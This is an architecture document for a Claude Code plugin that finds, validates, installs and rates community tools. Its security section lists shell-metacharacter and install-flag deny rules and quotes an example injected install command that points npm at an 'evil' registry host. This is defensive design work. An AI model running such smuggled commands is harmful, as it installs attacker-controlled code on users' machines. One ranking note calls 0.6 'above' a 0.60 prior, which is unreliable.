# ToolForge Architecture

Reference for maintainers and reviewers. The README explains what ToolForge does for users. This document explains how it works under the hood, what the trust boundaries are, where state lives, and what each script is allowed to do.

## 1. System overview

ToolForge is a thin shell over Claude Code's native plugin surface. It adds three behaviours that the base platform does not ship: live discovery of community tools for a category, validated install with an allow-listed executor, and a session-end Likert feedback loop whose ratings feed back into ranking. Everything else (skill dispatch, command parsing, hook eventing, WebSearch, WebFetch, subprocess invocation) is delegated to Claude Code. The plugin owns no runtime of its own.

There is no daemon, no server, no background worker, no IPC bus. Each user action is a one-shot subprocess. All persistent state is a single SQLite file at `~/.claude/toolforge.db` (WAL mode, 3-second busy timeout) plus a per-session byte-counter file in the OS temp directory. The plugin is uninstallable by deleting the plugin directory and the two state files: nothing else needs to be torn down.

Live discovery is not a Python web crawler. The work is performed by a Claude Code skill whose prompt orchestrates parallel `WebSearch` calls and `WebFetch` calls, with two Python scripts acting as hard trust boundaries between the model's outputs and side effects: `toolforge_validate_url.py` (URL allow-list, IDN-canonicalized) gates every fetch, and `toolforge_install.py` (argv allow-list plus executable-path checks) gates every install. The model proposes, the validators dispose. The Bayesian-shrunk composite ranking that combines stars, recency, and historical Likert ratings is computed inside the skill prompt itself using stats supplied in a single bulk shell-out to `toolforge_db.py`.

## 2. Component map

```
                                          USER
                                            |
                                            | types /toolforge UI
                                            v
+------------------------------------------------------------------------------+
|                                  CLAUDE CODE                                 |
|  (parses slash command, dispatches skills, invokes WebSearch/WebFetch/Bash)  |
+------------------------------------------------------------------------------+
            |                                                  ^
            | dispatch /toolforge UI                           | dispatch /toolforge-rate <n>
            v                                                  |
   +-----------------------+                          +--------------------+
   | commands/toolforge.md |                          | commands/          |
   | (slash-command body)  |                          | toolforge-rate.md  |
   +-----------------------+                          +--------------------+
            |                                                  |
            | invoke skill                                     | shell out (argv)
            v                                                  v
   +-----------------------+                          +---------------------+
   | skills/               |                          | bin/                |
   | toolforge-curator/    |                          | toolforge_rate.py   |
   | SKILL.md              |                          | (regex ^[1-5]$)     |
   +-----------------------+                          +---------------------+
            |                                                  |
            | 1. WebSearch x2 (parallel)                       v
            | 2. for url in results:                  +---------------------+
            |       shell out --------------------+   | bin/toolforge_db.py |
            |                                     v   | log_rating          |
            |                              +-------------+    |
            |                              | bin/        |    v
            |                              | toolforge_  | +-------------------+
            |                              | validate_   | | ~/.claude/        |
            |                              | url.py      | | toolforge.db      |
            |                              | (allow-list)| | (sqlite, WAL)     |
            |                              +-------------+ +-------------------+
            |                                     ^                ^
            | 3. WebFetch (URLs validated above)  |                |
            | 4. ONE bulk shell-out --------------+                |
            v                                                      |
   +---------------------+ get_rating_stats_bulk -----------------+|
   | bin/toolforge_db.py |<---------------------------------------+|
   +---------------------+                                         |
            |                                                      |
            | 5. composite ranking computed IN THE SKILL PROMPT    |
            | 6. top-5 returned to user, user picks one            |
            v                                                      |
   +-----------------------+                                       |
   | commands/toolforge.md |                                       |
   | shells out installer  |                                       |
   +-----------------------+                                       |
            |                                                      |
            v                                                      |
   +----------------------------+ (argv allow-list,                |
   | bin/toolforge_install.py   |  shlex parse,                    |
   |                            |  exec resolution,                |
   |                            |  subprocess shell=False)         |
   +----------------------------+                                  |
            |                                                      |
            +------------------------- log_install -----------------+


PARALLEL FEEDBACK FLOW (runs on every session)

   every Edit | Write | Bash tool call
            |
            v
   +--------------------------------+
   | hooks/post-tool-use-counter.py |  appends one byte to
   | (PostToolUse hook)             |  tempdir/toolforge_session_<sid>.count
   +--------------------------------+
                                          (atomic O_APPEND / FILE_APPEND_DATA)

   session ends
            |
            v
   +--------------------------------+
   | hooks/session-end-likert.py    |  st_size >= 5  ->  emit Likert prompt
   | (SessionEnd hook)              |  finally:        unlink counter file
   +--------------------------------+
                                          prompt suggests /toolforge-rate <n>
```

## 3. Storage schema

Database file: `~/.claude/toolforge.db`. Created lazily on first write by `toolforge_db.init_db()`. Two tables, two indexes, a single schema version pragma.

```sql
CREATE TABLE IF NOT EXISTS installs (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    tool_name   TEXT NOT NULL,
    category    TEXT NOT NULL,
    approved    INTEGER NOT NULL,
    installed_at TEXT DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ','now'))
);

CREATE TABLE IF NOT EXISTS ratings (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    tool_name   TEXT NOT NULL,
    rating      INTEGER NOT NULL CHECK (rating BETWEEN 1 AND 5),
    rated_at    TEXT DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ','now'))
);

CREATE INDEX IF NOT EXISTS idx_ratings_tool  ON ratings(tool_name);
CREATE INDEX IF NOT EXISTS idx_installs_tool ON installs(tool_name);
```

Connection-level pragmas applied on every `_connect()` call:

```python
PRAGMA journal_mode = WAL          # concurrent readers do not block the writer
PRAGMA busy_timeout = 3000         # 3 s wait if another connection holds the write lock
PRAGMA foreign_keys = ON           # cheap insurance against later schema migrations
```

Schema versioning is via `PRAGMA user_version` and a single `SCHEMA_VERSION` constant in `toolforge_db.py`. Migrations chain as `if current < 2: ... ; if current < 3: ...` inside `init_db()`. Bumping the constant is the only way schema changes propagate; `init_db()` runs at the top of every read or write entry point, so the migration check is unconditional.

Tool names are normalized to lowercase and validated against `^[a-z0-9._@/-]{1,80}$` (TOOL_NAME_RE). Categories are validated against `^[a-z]{1,32}$` (CATEGORY_RE). Both validations run at the Python layer in `toolforge_db.py` before any SQL parameter binding, so a misbehaving caller fails loudly with exit 2 rather than silently corrupting the data.

Ratings stored as integers 1 to 5, enforced by both the `CHECK` constraint and the Python regex in `toolforge_rate.py`.

## 4. Security boundaries

Two layers, both explicit, both Python scripts (not skill-prompt logic).

### 4.1 URL allow-list: `bin/toolforge_validate_url.py`

Every URL touched by `WebFetch`, including any URL the skill discovers by parsing a prior `WebFetch` result (README links, redirects, "see also" pointers, install instructions referencing other hosts), MUST be passed through this script. The validator is the trust boundary. Model judgement is not.

Verbatim host allow-list:

```python
ALLOWED_HOSTS = frozenset({
    "github.com",
    "raw.githubusercontent.com",
    "claudemarketplaces.com",
    "modelcontextprotocol.io",
    "aitmpl.com",
    "npmjs.com",
    "www.npmjs.com",
})
```

Validation order inside `is_allowed(url)`:

1. `_has_forbidden_bytes(url)`: reject any URL containing a backslash or a control byte (`< 0x20`). `urlparse` silently tolerates these; some downstream HTTP clients normalize backslash to slash, which enables parser-differential attacks (the validator sees one host, the fetcher sees another).
2. `urlparse(url)` and require `scheme in {"http", "https"}`.
3. Require non-empty `parsed.hostname`.
4. `_canonicalize_host(host)`: strip trailing FQDN dot, then `host.encode("idna").decode("ascii").lower()`. This defends against IDN homograph attacks (Cyrillic `і` visually identical to Latin `i`). On `UnicodeError` or `ValueError` the function returns a sentinel string `"\x00invalid:..."` that is guaranteed to miss the allow-list, with the original case preserved so logs are useful.
5. Membership check against `ALLOWED_HOSTS`.

CLI surface: `--list` prints the allow-list (the skill uses this to keep WebFetch `allowed_domains` in sync with the single source of truth), `--check <url>` is silent and exits 0/1 (for script callers), and a bare URL prints the canonicalized hostname on success or a refusal message on stderr with exit 1.

### 4.2 Install-command argv allow-list: `bin/toolforge_install.py`

The install command originates from WebFetch-summarized GitHub READMEs or other web sources that may be adversarial. The skill prompt is not a trust boundary. This script is. Validation runs in a fixed order; the first failing layer raises `ValueError` and the script exits 2 without ever calling `subprocess`.

```python
DENY_CHARS = re.compile(r"[;&|`<>\n\r\t]")
ALLOWED_FIRST = {"claude", "npx", "uvx", "npm", "pip", "pipx", "uv"}
CLAUDE_SUBS   = {"plugin": {"install", "marketplace", "list", "enable", "disable"},
                 "mcp":    {"add", "remove", "list"}}
NPM_SUBS      = {"install", "i", "add"}
PIP_SUBS      = {"install"}
UV_SUBS       = {"pip", "tool", "add"}
FLAG_RE         = re.compile(r"^-{1,2}[A-Za-z][A-Za-z0-9-]*(=[A-Za-z0-9._@+,-]+)?$")
PACKAGE_NAME_RE = re.compile(r"^@?[A-Za-z0-9][A-Za-z0-9._/-]*(@[A-Za-z0-9._+-]+)?$")
SERVER_NAME_RE  = re.compile(r"^[A-Za-z0-9._-]{1,64}$")
FLAG_DENY = {"--registry", "--index-url", "--extra-index-url", "--config",
             "--prefix", "--cache", "--script-shell", "--shell-escape",
             "--ignore-scripts=false", "--unsafe-perm"}
```

Order inside `_validate(install_command)`:

1. Non-empty after strip.
2. `DENY_CHARS` regex search on the raw string (rejects shell metacharacters: `;`, `&`, `|`, backtick, `<`, `>`, and the whitespace variants `\n`, `\r`, `\t`).
3. Reject literal `$(` or `${` substrings (variable / command substitution).
4. `shlex.split(install_command, posix=(os.name != "nt"))`: POSIX mode on Unix, Windows mode on Windows. Backslashes in Windows paths would otherwise be eaten as escape characters.
5. Require non-empty argv.
6. `_validate_head(argv)` dispatches on `argv[0]` (must be in `ALLOWED_FIRST`):
   - `claude` -> requires subcommand in `CLAUDE_SUBS`, then action in `CLAUDE_SUBS[sub]`, then per-action handling. `claude plugin install` requires a `PACKAGE_NAME_RE` plugin spec. `claude mcp add <server> <cmd...>` requires `SERVER_NAME_RE` on the server name, then recursively re-runs `_validate_head(argv[4:])` on the nested command, so a payload like `claude mcp add foo npm install --registry=http://evil` is rejected by the deny-list flag check inside the recursion, not at the outer layer.
   - `npx` / `uvx` -> every subsequent token must pass `_safe_token`.
   - `npm`, `pip`, `pipx`, `uv` -> subcommand must be in the per-head allow-list, then every token must pass `_safe_token`.
7. `_safe_token(t)` requires `FLAG_RE.match(t) or PACKAGE_NAME_RE.match(t)`, then rejects any flag whose key (split on `=`) is in `FLAG_DENY`.

Once validation passes, `_resolve(argv)` does PATH resolution and rejects unsafe executables:

```python
head = shutil.which(argv[0])
resolved = os.path.realpath(head)
# refuse user-writable bins (sidestepping PATH-shadow attacks):
blocked = [
    realpath("~/.local/bin"),
    realpath(os.environ.get("LOCALAPPDATA", "") or os.devnull),
    realpath("~/AppData/Roaming/npm"),
]
# refuse anything under node_modules/.bin (per-repo pin shadowing):
if (os.sep + "node_modules" + os.sep + ".bin" + os.sep) in resolved:
    raise FileNotFoundError(...)
```

Execution is `subprocess.run(resolved, shell=False, capture_output=True, text=True, check=False)`. Output is streamed back to the caller's stdout/stderr after the subprocess returns. There is no PTY. Interactive prompts inside an install command will hang for the duration of the 10-second hook timeout (the SessionEnd hook has its own 10-second cap, set in `plugin.json`); installers that need a tty are explicitly out of scope.

### 4.3 Rating regex: `bin/toolforge_rate.py`

```python
RATING_RE = re.compile(r"^[1-5]$")
```

Enforced at the Python layer before any DB call. The slash command `/toolforge-rate` pre-validates the argument in its markdown body as defense in depth; the Python regex is the actual gate.

## 5. Ranking algorithm

Composite score blends three signals, weights `0.3 / 0.3 / 0.4`. The Bayesian-shrunk Likert term gets the largest weight because user-supplied ratings are the noisiest and the most easily exploited signal; shrinkage to a neutral 3.0 prior with weight 5 limits the leverage of any single rating.

```
stars_norm   = min(1.0, log1p(stars) / log1p(50000))
recency_norm = exp(-days_since_last_commit / 180.0)

if n == 0:
    likert_norm = 0.6
else:
    posterior   = (decayed_avg * n + 3.0 * 5) / (n + 5)
    likert_norm = posterior / 5.0

score = stars_norm * 0.3 + recency_norm * 0.3 + likert_norm * 0.4
```

Notes per term:

- `stars_norm`: log scale so a 90k-star repo and a 5k-star repo do not both pin to 1.0. Clamp at 1.0 so single outliers cannot dominate.
- `recency_norm`: smooth exponential decay, never zero, no cliff at day 366. Half-life 180 days matches the rating half-life so the two recency-aware terms move in lockstep.
- `decayed_avg` is computed in `toolforge_db._compute_stats`: per-rating weight `exp(-age_days / 180.0)`, then weighted mean. If the sum of weights collapses to a near-zero number (every rating is several half-lives old), the function falls back to the raw arithmetic mean and prints a diagnostic to stderr.
- `likert_norm` for `n == 0` is 0.6, deliberately above the neutral 3.0/5.0 = 0.60 prior implies, so unrated tools rank cleanly between actively-disliked and moderately-liked tools instead of being penalized for absence of data.

Worked numbers (also reproduced in the skill prompt so the model can sanity-check):

| n  | ratings        | posterior calc                | likert_norm |
|----|----------------|-------------------------------|-------------|
| 0  | none           | (prior only)                  | 0.60        |
| 1  | one 1-star     | (1 + 15) / 6 = 2.67           | 0.53        |
| 3  | three 5-stars  | (15 + 15) / 8 = 3.75          | 0.75        |
| 10 | ten 5-stars    | (50 + 15) / 15 = 4.33         | 0.87        |

The composite is computed inside the skill prompt, not in Python. Python's job is to supply normalized counts and decayed averages via `get_rating_stats_bulk` in a single shell-out (subprocess cold-start on Windows is roughly 150 ms; five sequential calls would blow the 10-second budget). The skill then folds in stars and recency, which only the live discovery step knows about.

`toolforge_db.status` reuses the same Bayesian shrinkage in `_shrunk_score` so the CLI status output ranks the top 5 the same way the curator does.

## 6. Hook plumbing

Two hooks, configured in `.claude-plugin/plugin.json`:

```json
"PostToolUse": [{"matcher": "Edit|Write|Bash",
                 "hooks": [{"type": "command",
                            "command": "python \"${CLAUDE_PLUGIN_ROOT}/hooks/post-tool-use-counter.py\"",
                            "timeout": 5}]}],
"SessionEnd":  [{"matcher": "*",
                 "hooks": [{"type": "command",
                            "command": "python \"${CLAUDE_PLUGIN_ROOT}/hooks/session-end-likert.py\"",
                            "timeout": 10}]}]
```

### 6.1 Counter file

Path: `tempfile.gettempdir() / f"toolforge_session_{safe}.count"`, where `safe` is the session id with everything outside `[A-Za-z0-9_-]` stripped (falling back to a 16-char SHA1 prefix when stripping leaves the empty string). Both hooks compute this path the same way; `toolforge_db._session_counter_path` mirrors it so the `status` command can report the live count.

Per-event work in `post-tool-use-counter.py`:

```python
with open(path, "ab") as fh:
    fh.write(b".")
```

That is the whole increment. One byte per event, append mode. Single-byte appends are atomic under POSIX `O_APPEND` and Windows `FILE_APPEND_DATA`, so parallel `PostToolUse` fires from concurrent tool calls cannot lose increments and cannot tear a multi-byte write. The file's `st_size` is the count.

Windows can fail an `open(path, "ab")` with a sharing violation when multiple processes race the same handle. The counter retries up to 8 times with linear backoff (5 ms, 10 ms, ... 40 ms). After the final retry it exits 1 with the last `OSError` on stderr so Claude Code surfaces the failure rather than silently dropping the increment.

Stale counters from abandoned sessions are best-effort pruned on every call: any `toolforge_session_*.count` older than 7 days is unlinked. The pruner swallows every `OSError` so a permission glitch on one stale file cannot block the hot path.

### 6.2 SessionEnd

Threshold: 5 tool calls (`THRESHOLD = 5` in `session-end-likert.py`). The hook reads `path.stat().st_size`, compares to threshold, and either emits the Likert prompt or returns silently. Either way, the `finally` block unlinks the counter file:

```python
finally:
    try:
        path.unlink(missing_ok=True)
    except OSError as exc:
        print(f"toolforge likert: unlink failed: {exc}", file=sys.stderr)
```

The prompt is emitted as a JSON `hookSpecificOutput` with `additionalContext` containing the rating instructions. Claude Code injects this into the next session-end UI surface.

Both hooks cap stdin at 1 MiB (`MAX_STDIN`). Anything larger exits 1 with a "stdin exceeded 1 MiB cap" message. Bad JSON on stdin in the counter hook exits 1 (silent exit 0 would mask a broken core feedback loop). Bad JSON on stdin in SessionEnd emits a diagnostic via `hookSpecificOutput` and exits 0, because killing the session shutdown for a parser hiccup is the wrong default.

## 7. Fallback behaviour

Fallback data lives in `fallback/{category}.json`, one file per supported category (UI, backend, database, testing, devops). Each file is a JSON array of pre-vetted candidate objects matching the schema parsed at step 4 of the curator pipeline (`name`, `type`, `source_url`, `stars`, `last_commit`, `install_command`, `description`).

Integrity check, a hard gate that runs BEFORE any fallback JSON is loaded:

```bash
sha256sum -c "${CLAUDE_PLUGIN_ROOT}/fallback/manifest.sha256" 2>&1 | grep -v "^$" | head -20
```

On Windows where `sha256sum` may be absent, the skill falls back per file to `python -c "import hashlib; print(hashlib.sha256(open(r'<path>','rb').read()).hexdigest())"` and compares against the matching line in `manifest.sha256`. ANY mismatch (any line not ending in `OK`, any computed digest differing from the manifest) causes the skill to refuse to load and abort with a user-visible message naming the bad file. This blocks the failure mode of a malicious PR landing a poisoned install command that fires silently on the next network outage.

Three trigger modes:

| Mode             | Trigger                                                                                       | Behaviour                                                                                       |
|------------------|-----------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------|
| Full fallback    | Zero valid candidates after parsing, OR WebSearch/WebFetch failed entirely, OR wall clock > 10 s | Load `fallback/{category}.json` after integrity check, tell user "Live discovery unavailable, falling back to cached results." |
| Partial merge    | 1 to 4 valid candidates                                                                       | Keep all live candidates, top up with the highest-scored entries from `fallback/{category}.json` (de-duped by lowercase name) until 5 total. Tell user "Live discovery partial, topped up from cached results." |
| No fallback      | 5 or more valid candidates                                                                    | Return live results unchanged.                                                                  |

Partial merge preserves fresh signal: a real, brand-new tool with no ratings should not be discarded because the live result set is short.

## 8. Failure modes and exit codes

Every script fails loud. A non-zero exit means "do not pretend you got data". The slash command surfaces stderr verbatim.

| Script                            | Exit | Meaning                                                                           |
|-----------------------------------|------|-----------------------------------------------------------------------------------|
| `bin/toolforge_db.py`             | 0    | OK.                                                                                |
|                                   | 2    | Usage error (bad argv, invalid name/category/rating, bad approved flag).           |
|                                   | 3    | SQLite or OS error, or `status` saw a counter `stat()` failure.                    |
| `bin/toolforge_install.py`        | 0    | Install succeeded (or user said no at the confirm prompt; "Skipped." printed).     |
|                                   | 1    | Executable not on PATH, or executable refused (user-writable bin, node_modules/.bin), or subprocess failed to launch. |
|                                   | 2    | Validation refused (any layer of section 4.2), or no-tty refusal when `--yes` not set. |
|                                   | 3    | Subprocess succeeded but audit log write to SQLite failed.                         |
|                                   | 4    | Wrapped subprocess exited non-zero. The subprocess's own stdout and stderr are forwarded before this exit. |
| `bin/toolforge_rate.py`           | 0    | OK.                                                                                |
|                                   | 2    | Usage error or `^[1-5]$` regex failed or no installed tool to rate.                |
|                                   | 3    | DB error.                                                                          |
| `bin/toolforge_validate_url.py`   | 0    | URL allowed (canonicalized hostname printed), or `--list` succeeded, or `--check` allowed. |
|                                   | 1    | URL refused (off-list, bad bytes, IDN canonicalization failure, missing host), or `--check` refused. |
|                                   | 2    | Usage error (missing argv).                                                        |
| `hooks/post-tool-use-counter.py`  | 0    | Counter incremented, or empty stdin (no event), or stale-prune ran cleanly.        |
|                                   | 1    | JSON malformed, stdin oversized, or all 8 write retries failed.                    |
| `hooks/session-end-likert.py`     | 0    | Normal: either threshold not met, or prompt emitted, or graceful skip with diagnostic via `hookSpecificOutput`. SessionEnd always exits 0 when emitting a "skipping rating prompt" diagnostic so the session shutdown is not killed. |
|                                   | 1    | Stdin oversized (the only hard failure).                                           |

`_safe_log` in `toolforge_install.py` is the seam where audit logging can fail without aborting an install that has already executed. It returns False on any `ValueError`, `sqlite3.Error`, or `OSError`, prints the diagnostic to stderr, and the caller decides whether the missing audit is fatal (it is, for successful installs: that is exit 3) or merely noted (for refusals: the install never ran so the log is informational).

## 9. What v1 deliberately omits

These are intentional non-features. Adding any of them is a v2 conversation, not a v1 bug.

- **Proactive scanning.** ToolForge runs only when invoked: `/toolforge <category>` for discovery, `/toolforge-rate <n>` for feedback. There is no cron, no background poller, no "I noticed you might want a database tool" interjection. SessionEnd Likert prompt only fires when the threshold (5 tool calls) is met, and only when there is an installed tool to rate.
- **ML ranking.** The composite score is closed-form Bayesian shrinkage over three signals. No embeddings, no learned weights, no per-user model. The weights and the prior live in two places (`SKILL.md` and `toolforge_db.py`) and are tuned by editing them. Anyone reviewing a PR can read the formula and decide if the change is sensible.
- **Multi-user / cloud sync.** State is one SQLite file in the user's home directory. There is no remote storage, no telemetry, no account. Sharing ratings between machines is a manual file copy.
- **Custom TUI.** All user interaction goes through Claude Code's existing chat surface. The slash commands print plain text; the hooks emit `hookSpecificOutput` JSON; the installer asks for confirmation via `input()` or accepts `--yes`. No curses, no terminal escape sequences, no per-OS rendering.
- **Auto-application orchestration.** ToolForge installs the tool. It does not invoke the tool, configure the tool, or apply the tool to the user's project. That is what Claude Code already does, natively, once the plugin/MCP/skill is installed. Reimplementing it inside the curator would duplicate the platform and add a second source of truth for what "use this tool" means.
